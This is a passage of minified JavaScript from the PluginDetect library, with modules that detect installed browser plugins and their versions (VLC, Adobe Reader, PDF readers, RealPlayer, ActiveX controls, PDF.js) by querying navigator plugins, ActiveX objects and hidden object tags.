A=s.split(PluginDetect.splitNumRegx),y=r.split(PluginDetect.splitNumRegx),w,q,p,v,u,z;for(w=0;w<Math.min(A.length,y.length);w++){z=/([\d]+)([a-z]?)/.test(A[w]);q=parseInt(RegExp.$1,10);v=(w==2&&RegExp.$2.length>0)?RegExp.$2.charCodeAt(0):-1;z=/([\d]+)([a-z]?)/.test(y[w]);p=parseInt(RegExp.$1,10);u=(w==2&&RegExp.$2.length>0)?RegExp.$2.charCodeAt(0):-1;if(q!=p){return(q>p?1:-1)}if(w==2&&v!=u){return(v>u?1:-1)}}return 0},setPluginStatus:function(r,p,s){var q=this;q.installed=p?1:(s?(s>0?0.7:-0.1):(r?0:-1));if(p){q.version=PluginDetect.formatNum(p)}q.getVersionDone=q.installed==0.7||q.installed==-0.1?0:1;},getVersion:function(s){var t=this,r,p=null,q;if((!r||PluginDetect.dbug)&&t.nav.query().installed){r=1}if((!p||PluginDetect.dbug)&&t.nav.query().version){p=t.nav.version}if((!r||PluginDetect.dbug)&&t.axo.query().installed){r=1}if((!p||PluginDetect.dbug)&&t.axo.query().version){p=t.axo.version}if(!p||PluginDetect.dbug){q=t.codebase.isMin(s);if(q){t.setPluginStatus(0,0,q);return}}if(!p||PluginDetect.dbug){q=t.codebase.search();if(q){r=1;p=q}}t.setPluginStatus(r,p,0)},nav:{hasRun:0,installed:0,version:null,mimeType:["application/x-vlc-plugin","application/x-google-vlc-plugin","application/mpeg4-muxcodetable","application/x-matroska","application/xspf+xml","video/divx","video/webm","video/x-mpeg","video/x-msvideo","video/ogg","audio/x-flac","audio/amr","audio/amr"],find:"VLC.*Plug-?in",find2:"VLC|VideoLAN",avoid:"Totem|Helix",plugins:["VLC Web Plugin","VLC Multimedia Plug-in","VLC Multimedia Plugin","VLC multimedia plugin"],query:function(){var s=this,p,r,q=s.hasRun||!PluginDetect.hasMimeType(s.mimeType);s.hasRun=1;if(q){return s}r=PluginDetect.pd.findNavPlugin({find:s.find,avoid:s.avoid,mimes:s.mimeType,plugins:s.plugins});if(r){s.installed=1;if(r.description){p=PluginDetect.getNum(r.description+"","[\\d][\\d\\.]*[a-z]*")}if(p){s.version=p}}return s}},axo:{hasRun:0,installed:0,version:null,progID:"VideoLAN.VLCPlugin",query:function(){var q=this,s,p,r=q.hasRun;q.hasRun=1;if(r){return q}s=PluginDetect.getAXO(q.progID);if(s){q.installed=1;p=PluginDetect.getNum(PluginDetect.pd.getPROP(s,"VersionInfo"),"[\\d][\\d\\.]*[a-z]*");if(p){q.version=p}}return q}},codebase:{classID:"clsid:9BE31822-FDAD-461B-AD51-BE1D1C159921",isMin:function(p){this.$$=f;return PluginDetect.codebase.isMin(this,p)},search:function(){this.$$=f;return PluginDetect.codebase.search(this)},DIGITMAX:[[11,11,16]],DIGITMIN:[0,0,0,0],Upper:["999"],Lower:["0"],convert:[1]}};PluginDetect.addPlugin("vlc",f);var c={OTF:null,setPluginStatus:function(){var p=this,B=p.OTF,v=p.nav.detected,x=p.nav.version,z=p.nav.precision,C=z,u=x,s=v>0;var H=p.axo.detected,r=p.axo.version,w=p.axo.precision,D=p.doc.detected,G=p.doc.version,t=p.doc.precision,E=p.doc2.detected,F=p.doc2.version,y=p.doc2.precision;u=F||u||r||G;C=y||C||w||t;s=E>0||s||H>0||D>0;u=u||null;p.version=PluginDetect.formatNum(u);p.precision=C;var q=-1;if(B==3){q=p.version?0.5:-0.5}else{if(u){q=1}else{if(s){q=0}else{if(H==-0.5||D==-0.5){q=-0.15}else{if(PluginDetect.browser.isIE&&(!PluginDetect.browser.ActiveXEnabled||PluginDetect.browser.ActiveXFilteringEnabled)){q=-1.5}}}}}p.installed=q;if(p.getVersionDone!=1){var A=1;if((p.verify&&p.verify.isEnabled())||p.installed==0.5||p.installed==-0.5){A=0}else{if(p.doc2.isDisabled()==1){A=0}}p.getVersionDone=A}},getVersion:function(s,r){var p=this,q=0,t=p.verify;if(p.getVersionDone===null){p.OTF=0;if(t){t.init()}}PluginDetect.file.save(p,".pdf",r);if(p.getVersionDone===0){p.doc2.insertHTMLQuery();p.setPluginStatus();return}if((!q||PluginDetect.dbug)&&p.nav.query().version){q=1}if((!q||PluginDetect.dbug)&&p.axo.query().version){q=1}if((!q||PluginDetect.dbug)&&p.doc.query().version){q=1}if(1){p.doc2.insertHTMLQuery()}p.setPluginStatus()},getPrecision:function(v,u,t){if(PluginDetect.isString(v)){u=u||"";t=t||"";var q,s="\\d+",r="[\\.]",p=[s,s,s,s];for(q=4;q>0;q--){if((new RegExp(u+p.slice(0,q).join(r)+t)).test(v)){return q}}}return 0},nav:{detected:0,version:null,precision:0,mimeType:["application/pdf","application/vnd.adobe.pdfxml"],find:"Adobe.*PDF.*Plug-?in|Adobe.*Acrobat.*Plug-?in|Adobe.*Reader.*Plug-?in",plugins:["Adobe Acrobat","Adobe Acrobat and Reader Plug-in","Adobe Reader Plugin"],query:function(){var r=this,q,p=null;if(r.detected||!PluginDetect.hasMimeType(r.mimeType)){return r}q=PluginDetect.pd.findNavPlugin({find:r.find,mimes:r.mimeType,plugins:r.plugins});r.detected=q?1:-1;if(q){p=PluginDetect.getNum(q.description)||PluginDetect.getNum(q.name);p=PluginDetect.getPluginFileVersion(q,p);if(!p){p=r.attempt3()}if(p){r.version=p;r.precision=c.getPrecision(p)}}return r},attempt3:function(){var p=null;if(PluginDetect.OS==1){if(PluginDetect.hasMimeType("application/vnd.adobe.pdfxml")){p="9"}else{if(PluginDetect.hasMimeType("application/vnd.adobe.x-mars")){p="8"}else{if(PluginDetect.hasMimeType("application/vnd.adobe.xfdf")){p="6"}}}}return p}},activexQuery:function(w){var u="",t,q,s,r,p={precision:0,version:null};try{if(w){u=w.GetVersions()+"";}}catch(v){}if(u&&PluginDetect.isString(u)){t=/\=\s*[\d\.]+/g;r=u.match(t);if(r){for(q=0;q<r.length;q++){s=PluginDetect.formatNum(PluginDetect.getNum(r[q]));if(s&&(!p.version||PluginDetect.compareNums(s,p.version)>0)){p.version=s}}p.precision=c.getPrecision(u,"\\=\\s*")}}return p},axo:{detected:0,version:null,precision:0,progID:["AcroPDF.PDF","AcroPDF.PDF.1","PDF.PdfCtrl","PDF.PdfCtrl.5","PDF.PdfCtrl.1"],progID_dummy:"AcroDUMMY.DUMMY",query:function(){var t=this,q=c,u,v,s,r,p,w;if(t.detected){return t}t.detected=-1;v=PluginDetect.getAXO(t.progID_dummy);if(!v){w=PluginDetect.errObj}for(p=0;p<t.progID.length;p++){v=PluginDetect.getAXO(t.progID[p]);if(v){t.detected=1;u=q.activexQuery(v);s=u.version;r=u.precision;if(!PluginDetect.dbug&&s){break}}else{if(w&&PluginDetect.errObj&&w!==PluginDetect.errObj&&w.message!==PluginDetect.errObj.message){t.detected=-0.5}}}if(s){t.version=s}if(r){t.precision=r}return t}},doc:{detected:0,version:null,precision:0,classID:"clsid:CA8A9780-280D-11CF-A24D-444553540000",classID_dummy:"clsid:CA8A9780-280D-11CF-A24D-BA9876543210",DummySpanTagHTML:0,HTML:0,DummyObjTagHTML1:0,DummyObjTagHTML2:0,isDisabled:function(){var q=this,p=0;if(q.HTML){p=1}else{if(PluginDetect.dbug){}else{if(!PluginDetect.DOM.isEnabled.objectTagUsingActiveX()){p=1}}}return p},query:function(){var y=this,v=c,p=PluginDetect.DOM.altHTML,r=1,s,x,w,t,u=1,q;if(y.isDisabled()){return y}s=PluginDetect.DOM.iframe.insert(99,"Adobe Reader");y.DummySpanTagHTML=PluginDetect.DOM.insert("",[],[],p,v,u,s);y.HTML=PluginDetect.DOM.insert("object",["classid",y.classID],[],p,v,u,s);y.DummyObjTagHTML2=PluginDetect.DOM.insert("object",["classid",y.classID_dummy],[],p,v,u,s);PluginDetect.DOM.iframe.close(s);q=PluginDetect.DOM.getTagStatus(y.HTML,y.DummySpanTagHTML,y.DummyObjTagHTML1,y.DummyObjTagHTML2,0,0,r);x=v.activexQuery(y.HTML.obj());w=x.version;t=x.precision;y.detected=q>0||w?1:(q==-0.1||q==-0.5?-0.5:-1);if(w){y.version=w}if(t){y.precision=t}return y}},doc2:{detected:0,version:null,precision:0,classID:"clsid:CA8A9780-280D-11CF-A24D-444553540000",mimeType:"application/pdf",HTML:0,count:0,count2:0,time2:0,intervalLength:50,maxCount:150,isDisabled:function(){var r=this,v=c,u=v.axo,p=v.nav,x=v.doc,w,t,q=0,s;if(r.HTML){q=2}else{if(PluginDetect.dbug){}else{if(!PluginDetect.DOM.isEnabled.objectTagUsingActiveX()){q=2}else{w=(p?p.version:0)||(u?u.version:0)||(x?x.version:0)||0;t=(p?p.precision:0)||(u?u.precision:0)||(x?x.precision:0)||0;if(!w||!t||t>2||PluginDetect.compareNums(PluginDetect.formatNum(w),PluginDetect.formatNum("11"))<0){q=2}}}}if(q<2){s=PluginDetect.file.getValid(v);if(!s||!s.full){q=1}}return q},handlerSet:0,onMessage:function(){var p=this;return function(q){if(p.version){return}p.detected=1;if(PluginDetect.isArray(q)){q=q[0]}q=PluginDetect.getNum(q+"");if(q){if(!(/[.,_]/).test(q)){q+="."}q+="00000";if((/^(\d+)[.,_](\d)(\d\d)(\d\d)/).test(q)){q=RegExp.$1+","+RegExp.$2+","+RegExp.$3+","+RegExp.$4}p.version=PluginDetect.formatNum(q);p.precision=3;c.setPluginStatus()}}},isDefinedMsgHandler:function(q,r){try{return q?q.messageHandler!==r:0}catch(p){}return 1},queryObject:function(){var r=this,s=r.HTML,q=s?s.obj():0;if(!q){return}if(!r.handlerSet&&r.isDefinedMsgHandler(q)){try{q.messageHandler={onMessage:r.onMessage()}}catch(p){}r.handlerSet=1;r.count2=r.count;r.time2=(new Date()).getTime()}if(!r.detected){if(r.count>3&&!r.handlerSet){r.detected=-1}else{if(r.time2&&r.count-r.count2>=r.maxCount&&(new Date()).getTime()-r.time2>=r.intervalLength*r.maxCount){r.detected=-0.5}}}if(r.detected){if(r.detected!=-1){}}},insertHTMLQuery:function(){var u=this,p=c,r=PluginDetect.DOM.altHTML,q,s,t=0;if(u.isDisabled()){return u}if(p.OTF<2){p.OTF=2}q=PluginDetect.file.getValid(p).full;s=PluginDetect.DOM.iframe.insert(0,"Adobe Reader");PluginDetect.DOM.iframe.write(s,'<script type="text/javascript"><\/script>');u.HTML=PluginDetect.DOM.insert("object",["data",q].concat(PluginDetect.browser.isIE?["classid",u.classID]:["type",u.mimeType]),["src",q],r,p,t,s);PluginDetect.DOM.iframe.addHandler(s,u.onIntervalQuery);if(p.OTF<3&&u.HTML){p.OTF=3;}PluginDetect.DOM.iframe.close(s);return u},onIntervalQuery:function(){var p=c,q=p.doc2;q.count++;if(p.OTF==3){q.queryObject();if(q.detected){q.queryCompleted()}}if(p.OTF==3){PluginDetect.ev.setTimeout(q.onIntervalQuery,q.intervalLength)}},queryCompleted:function(){var q=this,p=c;if(p.OTF==4){return}p.OTF=4;p.setPluginStatus();PluginDetect.ev.callArray(p.DoneHndlrs);},z:0}};PluginDetect.addPlugin("adobereader",c);var l={OTF:null,detectIE3P:0,setPluginStatus:function(){var p=this,q=p.OTF,u=p.doc.result,t=p.mime.result,s=u>0||t>0;var r=p.axo.result;s=s||r>0;p.version=null;if(q==3){p.installed=-0.5}else{s=s?0:-1;if(s==-1){s=r==-0.5||u==-0.5?-0.15:(PluginDetect.browser.isIE&&(!PluginDetect.browser.ActiveXEnabled||PluginDetect.browser.ActiveXFilteringEnabled||!p.detectIE3P)?-1.5:-1)}p.installed=s}if(p.verify&&p.verify.isEnabled()){p.getVersionDone=0}else{if(p.getVersionDone!=1){p.getVersionDone=(p.installed==-0.5||(p.installed==-1&&p.doc.isDisabled1()<2&&p.doc.isDisabled2()<2))?0:1}}},getVersion:function(s,r,t){var p=this,q=false,v=p.doc,u=p.verify;if(PluginDetect.isDefined(t)){p.detectIE3P=t?1:0}if(p.getVersionDone===null){p.OTF=0;if(u){u.init()}}PluginDetect.file.save(p,".pdf",r);if(p.getVersionDone===0){if(u&&u.isEnabled()&&PluginDetect.isNum(p.installed)&&p.installed>=0){return}if(v.insertHTMLQuery()>0){q=true}p.setPluginStatus();return}if((!q||PluginDetect.dbug)&&p.mime.query()>0){q=true}if((!q||PluginDetect.dbug)&&p.axo.query()>0){q=true}if((!q||PluginDetect.dbug)&&v.insertHTMLQuery()>0){q=true}p.setPluginStatus()},mime:{mimeType:"application/pdf",result:0,query:function(){var p=this;if(!p.result){p.result=PluginDetect.hasMimeType(p.mimeType)?1:-1;}return p.result}},axo:{result:0,progID:["AcroPDF.PDF","AcroPDF.PDF.1","PDF.PdfCtrl","PDF.PdfCtrl.5","PDF.PdfCtrl.1"],progID_dummy:"AcroDUMMY.DUMMY",prodID3rd:["NitroPDF.IE.ActiveDoc","PDFXCviewIEPlugin.CoPDFXCviewIEPlugin","PDFXCviewIEPlugin.CoPDFXCviewIEPlugin.1","FoxitReader.FoxitReaderCtl","FoxitReader.FoxitReaderCtl.1","FOXITREADEROCX.FoxitReaderOCXCtrl","FOXITREADEROCX.FoxitReaderOCXCtrl.1"],query:function(){var r=this,q=l,p,s;if(!r.result){r.result=-1;if(!PluginDetect.getAXO(r.progID_dummy)){s=PluginDetect.errObj}for(p=0;p<r.progID.length;p++){if(PluginDetect.getAXO(r.progID[p])){r.result=1;if(!PluginDetect.dbug){break}}else{if(s&&PluginDetect.errObj&&s!==PluginDetect.errObj&&s.message!==PluginDetect.errObj.message){r.result=-0.5}}}if((r.result<-0.5&&q.detectIE3P)||PluginDetect.dbug){for(p=0;p<r.prodID3rd.length;p++){if(PluginDetect.getAXO(r.prodID3rd[p])){r.result=1;if(!PluginDetect.dbug){break}}}}}return r.result}},doc:{result:-1,result1:-1,result2:-1,classID:"clsid:CA8A9780-280D-11CF-A24D-444553540000",classID_dummy:"clsid:CA8A9780-280D-11CF-A24D-BA9876543210",mimeType:"application/pdf",mimeType_dummy:"application/dummymimepdf",DummySpanTagHTML:0,HTML1:0,HTML2:0,DummyObjTagHTML1:0,insertHTMLQuery:function(){var p=this;p.insertHTMLQuery1();p.insertHTMLQuery2();return p.queryObject()},queryObject:function(s){var t=this,r=t.queryObject1(s),q=t.queryObject2(s),p=r>0||q<0?r:(r<-0.5||q>0?q:(r==-0.1?r:0));if(PluginDetect.dbug){p=r==-0.1?r:(!r||!q?0:p)}t.result=p;return p},avoidBrowser:function(){var p=PluginDetect.browser;if((p.isGecko&&PluginDetect.compareNums(p.verGecko,PluginDetect.formatNum("10"))<=0&&PluginDetect.OS<=4)||(p.isOpera&&PluginDetect.compareNums(p.verOpera,PluginDetect.formatNum("11"))<=0&&PluginDetect.OS<=4)||(p.isChrome&&PluginDetect.compareNums(p.verChrome,PluginDetect.formatNum("10"))<0&&PluginDetect.OS<=4)){return 1}return 0},hasDummyPDF:function(){var p=PluginDetect.file.getValid(l);if(!p||!p.full){return 0}return 1},isDisabled1:function(){var q=this,p=0;if(q.HTML1||!PluginDetect.DOM.isEnabled.objectTag()){p=2}else{if(PluginDetect.dbug||PluginDetect.hasMimeType(q.mimeType)){}else{if(q.avoidBrowser()){p=2}}}if(p<2&&!q.hasDummyPDF()){p=1}return p},isDisabled2:function(){var r=this,q=0,p=PluginDetect.browser;if(r.HTML2){q=2}else{if(PluginDetect.dbug){}else{if(p.isIE){q=2}}}if(q<2&&!r.hasDummyPDF()){q=1}return q},insertHTMLQuery1:function(){var u=this,p=l,r,s,t=1,q=PluginDetect.DOM.altHTML;if(u.isDisabled1()){return u.result1}u.result1=0;if(p.OTF<2){p.OTF=2}r=PluginDetect.file.getValid(p).full;s=PluginDetect.DOM.iframe.insert(99,"PDFReader");u.DummySpanTagHTML=PluginDetect.DOM.insert("",[],[],q,p,t,s);u.HTML1=PluginDetect.DOM.insert("object",(PluginDetect.browser.isIE&&!p.detectIE3P?["classid",u.classID]:["type",u.mimeType]).concat(["data",r]),["src",r],q,p,t,s);u.DummyObjTagHTML1=PluginDetect.DOM.insert("object",(PluginDetect.browser.isIE&&!p.detectIE3P?["classid",u.classID_dummy]:["type",u.mimeType_dummy]),[],q,p,t,s);PluginDetect.DOM.iframe.close(s);u.queryObject1();if(PluginDetect.browser.isIE&&u.result===0){u.HTML1.span().innerHTML=u.HTML1.outerHTML;u.DummyObjTagHTML1.span().innerHTML=u.DummyObjTagHTML1.outerHTML}p.NOTF.init()},insertHTMLQuery2:function(){var t=this,p=l,q=PluginDetect.DOM.altHTML,s=1,r;if(t.isDisabled2()){return t.result2}t.result2=0;if(p.OTF<2){p.OTF=2}r=PluginDetect.DOM.iframe.insert(99,"PDFReader2");t.HTML2=PluginDetect.DOM.insert("img",["alt",q,"src",PluginDetect.file.getValid(p).full],[],q,p,s,r);PluginDetect.ev.addEvent(t.HTML2.obj(),"load",PluginDetect.ev.handler(t.onImgLoaded,t));PluginDetect.DOM.iframe.close(r);p.NOTF.init()},onImgLoaded:function(p){p.imgLoaded=1},queryObject1:function(r){var t=this,p=l,q=0,s=1;q=PluginDetect.DOM.getTagStatus(t.HTML1,t.DummySpanTagHTML,t.DummyObjTagHTML1,0,null,null,s);t.result1=q;return q},queryObject2:function(r){var s=this,p=l,q;if(s.HTML2.loaded){s.result2=s.imgLoaded?1:-1}q=s.result2;return q}},NOTF:{count:0,intervalLength:250,init:function(){var r=this,p=l,q=p.doc;if(p.OTF<3&&(q.HTML1||q.HTML2)){p.OTF=3;PluginDetect.ev.setTimeout(r.onIntervalQuery,r.intervalLength);}},onIntervalQuery:function(){var q=l.doc,r=l.NOTF,p;r.count++;if(l.OTF==3){p=q.queryObject(r.count);if(p>0||p<-0.1){r.queryCompleted()}}if(l.OTF==3){PluginDetect.ev.setTimeout(r.onIntervalQuery,r.intervalLength)}},queryCompleted:function(){var q=this,p=l;if(p.OTF==4){return}p.OTF=4;p.setPluginStatus();PluginDetect.ev.callArray(p.DoneHndlrs);}}};PluginDetect.addPlugin("pdfreader",l);var n={mimeType:["audio/x-pn-realaudio-plugin","audio/x-pn-realaudio"],classID:"clsid:CFCDAA03-8BE4-11cf-B84B-0020AFBBCCFA",setPluginStatus:function(r,p){var s=this,q;if(p){s.version=PluginDetect.formatNum(PluginDetect.getNum(p))}s.installed=s.version?1:(r?0:-1);q=s.installed==-1||s.instance.version;q=q||s.axo.version;s.getVersionDone=q?1:0;},navObj:{hasRun:0,installed:null,version:null,find:"RealPlayer.*Plug-?in",avoid:"Totem|QuickTime|Helix|VLC|Download",plugins:["RealPlayer(tm) G2 LiveConnect-Enabled Plug-In (32-bit) ","RealPlayer(tm) G2 LiveConnect-Enabled Plug-In (64-bit) ","RealPlayer Plugin"],query:function(){var q=this,s=n,r,p=!q.hasRun&&PluginDetect.hasMimeType(s.mimeType);q.hasRun=1;if(p){r=PluginDetect.pd.findNavPlugin({find:q.find,avoid:q.avoid,mimes:s.mimeType,plugins:q.plugins});q.installed=r?1:0;r=PluginDetect.getPluginFileVersion(r);if(r&&PluginDetect.compareNums(PluginDetect.formatNum(r),PluginDetect.formatNum("15"))>=0){q.version=r}}return q}},JS:{hasRun:0,version:null,regStr:"RealPlayer.*Version.*Plug-?in",mimetype:"application/vnd.rn-realplayer-javascript",q1:[[11,0,0],[999],[663],[663],[663],[660],[468],[468],[468],[468],[468],[468],[431],[431],[431],[372],[180],[180],[172],[172],[167],[114],[0]],q3:[[6,0],[12,99],[12,69],[12,69],[12,69],[12,69],[12,69],[12,69],[12,69],[12,69],[12,69],[12,69],[12,46],[12,46],[12,46],[11,3006],[11,2806],[11,2806],[11,2804],[11,2804],[11,2799],[11,2749],[11,2700]],compare:function(t,s){var r,q=t.length,v=s.length,p,u;for(r=0;r<Math.max(q,v);r++){p=r<q?t[r]:0;u=r<v?s[r]:0;if(p>u){return 1}if(p<u){return -1}}return 0},convertNum:function(t,q,w){var v=this,u,s,p,r=null;if(!t||!(u=PluginDetect.formatNum(t))){return r}u=u.split(PluginDetect.splitNumRegx);for(p=0;p<u.length;p++){u[p]=parseInt(u[p],10)}if(v.compare(u.slice(0,Math.min(q[0].length,u.length)),q[0])!==0){return r}s=u.length>q[0].length?u.slice(q[0].length):[];if(v.compare(s,q[1])>0||v.compare(s,q[q.length-1])<0){return r}for(p=q.length-1;p>=1;p--){if(p==1){break}if(v.compare(q[p],s)===0&&v.compare(q[p],q[p-1])===0){break}if(v.compare(s,q[p])>=0&&v.compare(s,q[p-1])<0){break}}return w[0].join(".")+"."+w[p].join(".")},isEnabled:function(){var p=this;return !p.hasRun&&PluginDetect.OS==1&&PluginDetect.hasMimeType(p.mimetype)?1:0},query:function(){var u=this,t,r,s,p=u.isEnabled();u.hasRun=1;if(p){r=PluginDetect.pd.findNavPlugin({find:u.regStr,mimes:u.mimetype});if(r){t=PluginDetect.formatNum(PluginDetect.getNum(r.description))}if(t){var q=t.split(PluginDetect.splitNumRegx);s=1;if(u.compare(q,[6,0,12,200])<0){s=-1}else{if(u.compare(q,[6,0,12,1739])<=0&&u.compare(q,[6,0,12,857])>=0){s=-1}}if(s<0){r=u.convertNum(t,u.q3,u.q1);u.version=r?r:t}}}return u}},instance:{hasRun:0,version:null,HTML:null,isEnabled:function(){var q=this,r=n,p=1;if(!PluginDetect.DOM.isEnabled.objectTag()){p=0}else{if(PluginDetect.dbug){}else{if(q.hasRun||PluginDetect.DOM.isEnabled.objectTagUsingActiveX()||!PluginDetect.hasMimeType(r.mimeType)||(PluginDetect.browser.isGecko&&PluginDetect.compareNums(PluginDetect.browser.verGecko,PluginDetect.formatNum("1,8"))<0)||(PluginDetect.browser.isOpera&&PluginDetect.compareNums(PluginDetect.browser.verOpera,PluginDetect.formatNum("10"))<0)){p=0}}}return p},query:function(){var p=this,t=n,s,q=p.isEnabled();p.hasRun=1;if(q){p.HTML=PluginDetect.DOM.insert("object",["type",t.mimeType[0]],["src","","autostart","false","imagestatus","false","controls","stopbutton"],"",t);s=p.HTML.obj();try{p.version=PluginDetect.getNum(s.GetVersionInfo())}catch(r){}PluginDetect.DOM.setStyle(s,["display","none"]);}return p}},axo:{hasRun:0,installed:null,version:null,progID:["rmocx.RealPlayer G2 Control","rmocx.RealPlayer G2 Control.1","RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)","RealVideo.RealVideo(tm) ActiveX Control (32-bit)","RealPlayer"],query:function(){var r=this,t,p,q;if(!r.hasRun){r.hasRun=1;for(p=0;p<r.progID.length;p++){t=PluginDetect.getAXO(r.progID[p]);if(t){r.installed=1;q=0;try{q=t.GetVersionInfo()+""}catch(s){}if(q){r.version=q;if(!PluginDetect.dbug){break}}}}}return r}},getVersion:function(s,q){var t=this,p=null,r=0;if((!r||PluginDetect.dbug)&&t.axo.query().installed){r=1}if((!p||PluginDetect.dbug)&&t.axo.query().version){p=t.axo.version}if((!r||PluginDetect.dbug)&&t.navObj.query().installed){r=1}if((!p||PluginDetect.dbug)&&t.navObj.query().version){p=t.navObj.version}if((!p||PluginDetect.dbug)&&t.JS.query().version){r=1;p=t.JS.version}if(((!r&&!p)||q||PluginDetect.dbug)&&t.instance.query().version){r=1;p=t.instance.version}t.setPluginStatus(r,p)}};PluginDetect.addPlugin("realplayer",n);var g={setPluginStatus:function(r,q,s){var p=this;p.version=PluginDetect.formatNum(q);p.installed=q?1:(r?0:(s?-3:-1))},getVersion:function(t,r){var q=this,s=null,p=null;q.getVersionDone=0;if(r&&PluginDetect.isString(r)&&(/[^\s]+/).test(r)){r=r.replace(/\s/g,"")}else{q.setPluginStatus(0,0,1);return}if(!q.obj){q.obj=document.createElement("div");try{q.obj.style.behavior="url(#default#clientcaps)"}catch(u){}}try{p=q.obj.getComponentVersion(r,"componentid").replace(/,/g,".")}catch(u){}try{if(!p){s=q.obj.isComponentInstalled(r,"componentid")?1:0}}catch(u){}q.setPluginStatus(s,p)}};PluginDetect.addPlugin("iecomponent",g);var d={storage:{},codebase:{isMin:function(p){this.$$=d;return PluginDetect.codebase.isMin(this,p)},search:function(){this.$$=d;return PluginDetect.codebase.search(this)},classID:"",DIGITMAX:[[100,100,100,0]],DIGITMIN:[0,0,0,0],Upper:["99999"],Lower:["0"],convert:[1]},clone:function(u,r){var v=this,q,p,s=0,t=20;if(PluginDetect.isNum(u)||PluginDetect.isString(u)||u===null||PluginDetect.isFunc(u)||u===PluginDetect||u===PluginDetect.Plugins||u===v){return u}else{if(u.window||u.firstChild||u.appendChild){return u}else{if(PluginDetect.isArray(u)){p=[]}else{if(u){p={}}}}}for(q in u){if(PluginDetect.hasOwn(u,q)){s++;p[q]=v.clone(u[q],q)}}return p},setPluginStatus:function(s,p,q){var r=this;r.getVersionDone=0;r.version=PluginDetect.formatNum(p);r.installed=p?1:(s?(s>0?0.7:-0.1):(q?-3:-1))},getVersion:function(t,u,y){var z=this,q=null,v=null,w,s,r,p="";if(PluginDetect.codebase.isDisabled()){z.setPluginStatus(0,0);return}if(u&&PluginDetect.isString(u)&&(/[^\s]+/).test(u)){u=u.replace(/\s/g,"");p=u.replace(/[\:\-\/]/g,"$")}else{z.setPluginStatus(0,0,1);return}if(PluginDetect.isArray(y)){if(!y.length){y.push(0)}for(w=0;w<y.length;w++){if(!PluginDetect.isDefined(y[w])){y[w]=0}if(!PluginDetect.isNum(y[w])||y[w]<0||y[w]>99999999){z.setPluginStatus(0,0,1);return}}if(p&&z.storage[p]){s=z.storage[p].codebase;r=0;for(w=0;w<Math.max(y.length,s.DIGITMAX[0].length);w++){if((w<y.length?y[w]:0)>(w<s.DIGITMAX[0].length?s.DIGITMAX[0][w]:0)){r=1;break}}if(r&&s.version){r=s.version.split(PluginDetect.splitNumRegx);for(w=0;w<Math.max(r.length,s.DIGITMAX[0].length);w++){if((w<r.length?r[w]:0)===(w<s.DIGITMAX[0].length?s.DIGITMAX[0][w]:0)){z.storage[p]=null;break}}}}}else{y=[0]}if(p&&!z.storage[p]){z.storage[p]={codebase:z.clone(z.codebase)};z.storage[p].codebase.classID=u;if(PluginDetect.isArray(y)&&y.length){z.storage[p].codebase.DIGITMAX=[[].concat(y)]}}if(t){q=z.storage[p].codebase.isMin(t);v=z.storage[p].codebase.version}else{q=0;v=z.storage[p].codebase.search()}z.setPluginStatus(q,v)}};PluginDetect.addPlugin("activex",d);var b={OTF:null,setPluginStatus:function(){var q=this,r=q.doc.result,p=q.OTF;q.version=null;if(p==3){q.installed=-0.5}else{q.installed=r>0?0:-1}if(q.verify&&q.verify.isEnabled()){q.getVersionDone=0}else{if(q.getVersionDone!=1){q.getVersionDone=(q.installed==-0.5||(q.installed==-1&&q.doc.isDisabled()<2))?0:1}}},getVersion:function(r,q){var s=this,p=false,u=s.verify,t=s.doc;if(s.getVersionDone===null){s.OTF=0;if(u){u.init()}}PluginDetect.file.save(s,".pdf",q);if(s.getVersionDone===0){if(u&&u.isEnabled()&&PluginDetect.isNum(s.installed)&&s.installed>=0){return}}if((!p||PluginDetect.dbug)&&t.insertHTMLQuery()>0){p=true}s.setPluginStatus()},doc:{result:0,mimeType:"application/pdf",mimeType_dummy:"application/dummymimepdf",DummySpanTagHTML:0,HTML:0,DummyObjTagHTML1:0,isDisabled:function(){var t=this,s=b,r=0,p=PluginDetect.browser,q;if(s.OTF>=2||!PluginDetect.DOM.isEnabled.objectTag()||PluginDetect.DOM.isEnabled.objectTagUsingActiveX()){r=2}else{if(PluginDetect.dbug){}else{if(!p.isGecko||PluginDetect.compareNums(p.verGecko,PluginDetect.formatNum("10"))<0||(PluginDetect.compareNums(p.verGecko,PluginDetect.formatNum("19"))<0&&PluginDetect.hasMimeType(t.mimeType))){r=2}}}if(r<2){q=PluginDetect.file.getValid(s);if(!q||!q.full){r=1}}return r},tabIndex:null,method:"",queryObject:function(r){var u=this,t=u.HTML?u.HTML.obj():0,v,q,p=PluginDetect.dbug&&(u.HTML&&!u.HTML.loaded)?0:1;v=PluginDetect.DOM.getTagStatus(u.HTML,u.DummySpanTagHTML,u.DummyObjTagHTML1,0);if((!u.result||PluginDetect.dbug)&&v<-0.1){if(p){u.result=-1}u.method+="1,";}if((!u.result||PluginDetect.dbug)&&v>0&&!PluginDetect.hasMimeType(u.mimeType)){if(p){u.result=1}u.method+="2,";}try{q=t?t.tabIndex:null}catch(s){}if(!PluginDetect.isNum(u.tabIndex)&&PluginDetect.isNum(q)){u.tabIndex=q}if((!u.result||PluginDetect.dbug)&&v>0){if(PluginDetect.isNum(q)&&PluginDetect.isNum(u.tabIndex)&&u.tabIndex!==q){if(p){u.result=1}u.method+="4,";}else{if(p){u.result=-1}u.method+="5,";}}return u.result},insertHTMLQuery:function(){var u=this,s=b,q,r,t=1,p=PluginDetect.DOM.altHTML;if(u.isDisabled()){return u.result}if(s.OTF<2){s.OTF=2}q=PluginDetect.file.getValid(s).full;r=PluginDetect.DOM.iframe.insert(99,"PDFjs");u.DummySpanTagHTML=PluginDetect.DOM.insert("",[],[],p,s,t,r);u.HTML=PluginDetect.DOM.insert("object",["type",u.mimeType,"data",q],["src",q],p,s,t,r);u.DummyObjTagHTML1=PluginDetect.DOM.insert("object",["type",u.mimeType_dummy],[],p,s,t,r);PluginDetect.DOM.iframe.close(r);u.queryObject();if(u.result&&!PluginDetect.dbug){return u.result}s.NOTF.init();return u.result}},NOTF:{count:0,intervalLength:250,init:function(){var r=this,p=b,q=p.doc;if(p.OTF<3&&q.HTML){p.OTF=3;PluginDetect.ev.setTimeout(r.onIntervalQuery,r.intervalLength);}},onIntervalQuery:function(){var p=b.doc,q=b.NOTF;q.count++;if(b.OTF==3){p.queryObject(q.count);if(p.result){q.queryCompleted()}}if(b.OTF==3){PluginDetect.ev.setTimeout(q.onIntervalQuery,q.intervalLength)}},queryCompleted:function(){var q=this,p=b;if(p.OTF==4){return}p.OTF=4;p.setPluginStatus();PluginDetect.ev.callArray(p.DoneHndlrs);}}};PluginDetect.addPlugin("pdfjs",b);

